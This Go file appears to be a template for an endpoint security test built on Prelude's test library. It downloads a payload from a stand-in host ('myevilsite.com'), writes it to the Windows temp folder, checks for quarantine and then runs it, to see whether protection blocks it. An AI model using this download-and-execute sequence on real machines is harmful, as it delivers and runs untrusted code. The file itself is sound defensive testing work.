package main

import (
	"flag"
	"os"
	"time"

	"github.com/dumpst3rfir3/meh"
	endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

var cleanFlag bool
var filesWritten []string
var name string = "My Prelude Detect Test"
var version string = "1.0.0"

func clean() {
	meh.CleanFiles(filesWritten...)
}

func init() {
	flag.BoolVar(&cleanFlag, "clean", false, "Just do clean up.")
	flag.Parse()
}

func main() {
	if cleanFlag {
		setup()
		clean()
		os.Exit(0)
	}

	meh.StartWithCustomTimeout(test, 90*time.Second, clean)
}

func run() {
	var cmd []string = []string{
		filesWritten[0],
		"--payloadArg",
	}
	var e error
	var p *os.Process

	if p, e = meh.Run(cmd); e != nil {
		endpoint.Say("Execution failed: %s", e)
		endpoint.Stop(endpoint.ExecutionPrevented)
	}

	endpoint.Wait(5 * time.Second)

	// Doesn't kill children, do that manually in clean
	endpoint.Say("Killing %s process...", name)
	if e = p.Kill(); e != nil {
		endpoint.Say("Failed to kill process: %s", e)
		endpoint.Stop(endpoint.UnexpectedTestError)
	}

	endpoint.Say("Successfully killed process")
}

func setup() {
	// TODO:put any setup stuff here
}

func test() {
	var b []byte
	var expectedMD5 string = "deadbeefdeadbeefdeadbeefdeadbeef"
	var outfile string = `C:\Windows\Temp\testpayload.exe`
	var url string = "https://myevilsite.com/payload"

	endpoint.Say("Executing %s test v%s", name, version)

	// Prep
	setup()

	// Download from URL
	b = meh.Download(url, expectedMD5, "")

	// Write to c:\windows\temp and expect quarantine
	meh.CheckQuarantine(outfile, b, false)

	// It will only get here if outfile is not quarantined
	filesWritten = append(filesWritten, outfile)

	// Written to disk, so try to run it and see if it gets blocked
	run()

	endpoint.Stop(endpoint.Unprotected)

}
